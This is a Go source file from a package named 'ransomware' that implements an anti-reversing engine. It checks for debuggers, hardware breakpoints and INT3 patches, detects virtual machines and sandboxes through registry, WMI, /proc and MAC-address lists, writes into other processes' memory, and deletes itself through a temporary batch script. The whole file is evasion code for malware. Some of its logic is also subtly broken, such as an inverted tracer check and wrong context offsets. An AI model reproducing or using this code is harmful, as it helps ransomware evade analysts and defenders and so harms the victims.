package ransomware

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"hash/crc32"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

type AntiReversingEngine struct {
	config       *RansomwareConfig
	selfPath     string
	checksum     uint32
	originalHash string
	dirtyCleaners []string
}

func NewAntiReversingEngine(cfg *RansomwareConfig) *AntiReversingEngine {
	a := &AntiReversingEngine{config: cfg}
	a.selfPath, _ = os.Executable()
	a.checksum = a.computeCRC32(a.selfPath)
	a.computeHash()
	return a
}

func (a *AntiReversingEngine) computeCRC32(path string) uint32 {
	data, err := os.ReadFile(path)
	if err != nil {
		return 0
	}
	return crc32.ChecksumIEEE(data)
}

func (a *AntiReversingEngine) computeHash() string {
	data, err := os.ReadFile(a.selfPath)
	if err != nil {
		return ""
	}
	h := sha256.Sum256(data)
	a.originalHash = hex.EncodeToString(h[:])
	return a.originalHash
}

func (a *AntiReversingEngine) IsDebuggerPresent() bool {
	if runtime.GOOS != "windows" {
		procPath := "/proc/self/status"
		if data, err := os.ReadFile(procPath); err == nil {
			return strings.Contains(string(data), "TracerPid:\t0")
		}
		return false
	}

	kernel32 := windows.MustLoadDLL("kernel32.dll")
	isDbgPresent := kernel32.MustFindProc("IsDebuggerPresent")
	ret, _, _ := isDbgPresent.Call()
	return ret != 0
}

func (a *AntiReversingEngine) CheckRemoteDebugger() bool {
	if runtime.GOOS != "windows" {
		return false
	}

	kernel32 := windows.MustLoadDLL("kernel32.dll")
	checkRemote := kernel32.MustFindProc("CheckRemoteDebuggerPresent")

	currProc := windows.CurrentProcess()
	var debuggerPresent uintptr
	ret, _, _ := checkRemote.Call(uintptr(currProc), uintptr(unsafe.Pointer(&debuggerPresent)))
	return ret != 0 && debuggerPresent != 0
}

func (a *AntiReversingEngine) DetectHardwareBreakpoints() ([]int, error) {
	if runtime.GOOS != "windows" {
		return nil, fmt.Errorf("Windows only")
	}

	type CONTEXT64 struct {
		P1Home, P2Home, P3Home, P4Home, P5Home, P6Home uint64
		ContextFlags  uint32
		MxCsr         uint32
		SegCs, SegDs, SegEs, SegFs, SegGs, SegSs uint16
		EFlags        uint32
		Dr0, Dr1, Dr2, Dr3, Dr4, Dr5, Dr6, Dr7 uint64
		Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi, R8, R9, R10, R11, R12, R13, R14, R15 uint64
		Rip           uint64
		FltSave       [16]uint64
		VectorRegister [416]byte
	}

	var ctx CONTEXT64
	ctx.ContextFlags = 0x100010

	kernel32 := windows.MustLoadDLL("kernel32.dll")
	getThreadCtx := kernel32.MustFindProc("GetThreadContext")

	currThread := windows.CurrentThread()
	ret, _, _ := getThreadCtx.Call(uintptr(currThread), uintptr(unsafe.Pointer(&ctx)))
	if ret == 0 {
		return nil, fmt.Errorf("GetThreadContext failed")
	}

	var usedBPs []int
	bpRegs := []struct {
		reg uint64
		idx int
	}{{ctx.Dr0, 0}, {ctx.Dr1, 1}, {ctx.Dr2, 2}, {ctx.Dr3, 3}}

	for _, bp := range bpRegs {
		if bp.reg != 0 {
			usedBPs = append(usedBPs, bp.idx)
		}
	}

	if ctx.Dr7&0x3 != 0 {
		usedBPs = append(usedBPs, -1)
	}

	return usedBPs, nil
}

func (a *AntiReversingEngine) ScanINT3() ([]uint64, error) {
	data, err := os.ReadFile(a.selfPath)
	if err != nil {
		return nil, err
	}

	var hits []uint64
	for i := 0; i < len(data); i++ {
		if data[i] == 0xCC {
			if i > 0 && data[i-1] == 0xCC {
				continue
			}
			hits = append(hits, uint64(i))
		}
	}

	return hits, nil
}

func (a *AntiReversingEngine) VerifyIntegrity() (bool, uint32, uint32) {
	current := a.computeCRC32(a.selfPath)
	return current == a.checksum, a.checksum, current
}

func (a *AntiReversingEngine) TimingCheck() bool {
	start := time.Now()
	_ = []byte{0x00}
	elapsed := time.Since(start)

	if elapsed > 100*time.Microsecond {
		return false
	}
	return true
}

func (a *AntiReversingEngine) RDTSCCheck() uint64 {
	if runtime.GOOS != "windows" {
		return uint64(time.Now().UnixNano())
	}

	ntdll := windows.MustLoadDLL("ntdll.dll")
	ntQueryInfoFile := ntdll.MustFindProc("NtQueryInformationFile")

	start := time.Now()
	ntQueryInfoFile.Call(0, 0, 0, 0, 0)
	elapsed := time.Since(start)

	return uint64(elapsed.Nanoseconds())
}

func (a *AntiReversingEngine) AntiSandboxDetect() bool {
	checks := []string{
		"VBOX", "VMWARE", "VIRTUAL", "QEMU", "BOCHS",
		"VirtIO", "Hyper-V", "Microsoft Virtual",
	}

	if runtime.GOOS == "windows" {
		k, err := windows.OpenKey(windows.HKEY_LOCAL_MACHINE,
			windows.StringToUTF16Ptr("SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum"),
			windows.KEY_READ)
		if err == nil {
			buf := make([]byte, 512)
			var bufLen uint32 = 512
			windows.QueryValueEx(k, windows.StringToUTF16Ptr("0"), nil, &buf[0], &bufLen)
			windows.CloseKey(k)
			val := strings.ToUpper(string(buf[:bufLen]))
			for _, c := range checks {
				if strings.Contains(val, c) {
					return true
				}
			}
		}

		cmd := exec.Command("powershell", "-Command",
			"Get-WmiObject Win32_ComputerSystem | Select-Object -ExpandProperty Manufacturer")
		out, _ := cmd.CombinedOutput()
		manufacturer := strings.ToUpper(string(out))
		for _, c := range checks {
			if strings.Contains(manufacturer, c) {
				return true
			}
		}
	}

	if runtime.GOOS == "linux" {
		data, err := os.ReadFile("/proc/cpuinfo")
		if err == nil {
			lower := strings.ToLower(string(data))
			if strings.Contains(lower, "hypervisor") {
				return true
			}
		}

		if _, err := os.Stat("/dev/vda"); err == nil {
			return true
		}
		if _, err := os.Stat("/sys/class/dmi/id/product_serial"); err == nil {
			data, _ := os.ReadFile("/sys/class/dmi/id/product_serial")
			if strings.Contains(string(data), "Not Specified") || strings.Contains(string(data), "None") {
				return true
			}
		}
	}

	return false
}

func (a *AntiReversingEngine) MACOUIRandomCheck() bool {
	ifaces, err := interfaces()
	if err != nil {
		return true
	}

	for _, iface := range ifaces {
		oui := iface[:6]
		for _, knownOUI := range knownVirtualOUIs {
			if strings.EqualFold(oui, knownOUI) {
				return true
			}
		}
	}
	return false
}

var knownVirtualOUIs = []string{
	"00:05:69", "00:0C:29", "00:1C:42", "00:1C:14",
	"00:50:56", "00:15:5D", "08:00:27", "00:1B:21",
}

func interfaces() ([]string, error) {
	ifaces, err := netInterfaces()
	if err != nil {
		return nil, err
	}
	var addrs []string
	for _, iface := range ifaces {
		addrs = append(addrs, iface)
	}
	return addrs, nil
}

func netInterfaces() ([]string, error) {
	cmd := exec.Command("getmac", "/FO", "CSV", "/NH")
	out, err := cmd.CombinedOutput()
	if err != nil {
		return nil, err
	}
	var macs []string
	for _, line := range strings.Split(string(out), "\n") {
		line = strings.Trim(line, "\"\r\n")
		if line == "" {
			continue
		}
		parts := strings.Split(line, "\",\"")
		if len(parts) >= 1 {
			mac := strings.Trim(parts[0], "\"")
			if mac != "" && mac != "N/A" {
				macs = append(macs, mac)
			}
		}
	}
	return macs, nil
}

func (a *AntiReversingEngine) SelfDestruct() error {
	if runtime.GOOS != "windows" {
		os.Remove(a.selfPath)
		return nil
	}

	batPath := os.Getenv("TEMP") + "\\__cleanup.bat"
	script := fmt.Sprintf(`@echo off
:loop
del /f /q "%s" >nul 2>&1
if exist "%s" goto loop
del /f /q "%%~f0" >nul 2>&1
exit`, a.selfPath, a.selfPath)

	os.WriteFile(batPath, []byte(script), 0644)
	exec.Command("cmd", "/c", batPath).Start()

	cleanupPath := a.selfPath + ":Zone.Identifier"
	os.Remove(cleanupPath)

	exec.Command("powershell", "-Command",
		`Remove-Item -LiteralPath "`+a.selfPath+`" -Force -ErrorAction SilentlyContinue`).Run()

	return nil
}

func (a *AntiReversingEngine) ObfuscateControlFlow(pid uint32) error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("Windows only")
	}

	handle, err := windows.OpenProcess(windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE, false, pid)
	if err != nil {
		return err
	}
	defer windows.CloseHandle(handle)

	base := uintptr(0x7FF700000000)
	page := make([]byte, 4096)
	var read uintptr
	windows.ReadProcessMemory(handle, base, &page[0], uintptr(len(page)), &read)

	for i := 0; i < len(page)-1; i++ {
		if page[i] == 0x90 && page[i+1] == 0x90 {
			page[i] = 0xEB
			page[i+1] = 0x00
		}
	}

	var written uintptr
	windows.WriteProcessMemory(handle, base, &page[0], uintptr(len(page)), &written)

	return nil
}

func (a *AntiReversingEngine) ClearHardwareBreakpoints() error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("Windows only")
	}

	currThread := windows.CurrentThread()
	kernel32 := windows.MustLoadDLL("kernel32.dll")
	getThreadCtx := kernel32.MustFindProc("GetThreadContext")
	setThreadCtx := kernel32.MustFindProc("SetThreadContext")

	ctx := make([]byte, 1232)
	var ctxFlags uint32 = 0x100010
	copy(ctx[40:44], (*(*[4]byte)(unsafe.Pointer(&ctxFlags)))[:])

	getThreadCtx.Call(uintptr(currThread), uintptr(unsafe.Pointer(&ctx[0])))

	for i := 0; i < 8; i++ {
		offset := 48 + i*8
		ctx[offset] = 0
		ctx[offset+1] = 0
	}
	setThreadCtx.Call(uintptr(currThread), uintptr(unsafe.Pointer(&ctx[0])))

	return nil
}

func (a *AntiReversingEngine) FullAntiDebugSuite() map[string]interface{} {
	result := make(map[string]interface{})

	result["debugger_present"] = a.IsDebuggerPresent()
	result["remote_debugger"] = a.CheckRemoteDebugger()

	bps, _ := a.DetectHardwareBreakpoints()
	result["hardware_bps"] = bps
	result["hw_bp_count"] = len(bps)

	int3s, _ := a.ScanINT3()
	result["int3_count"] = len(int3s)

	valid, orig, curr := a.VerifyIntegrity()
	result["integrity_ok"] = valid
	result["checksum_original"] = fmt.Sprintf("0x%08X", orig)
	result["checksum_current"] = fmt.Sprintf("0x%08X", curr)

	result["timing_check"] = a.TimingCheck()
	result["rdtsc_delta"] = a.RDTSCCheck()
	result["in_sandbox"] = a.AntiSandboxDetect()
	result["mac_virtual"] = a.MACOUIRandomCheck()

	return result
}

var _, _, _ = syscall.Syscall(0, 0, 0, 0)
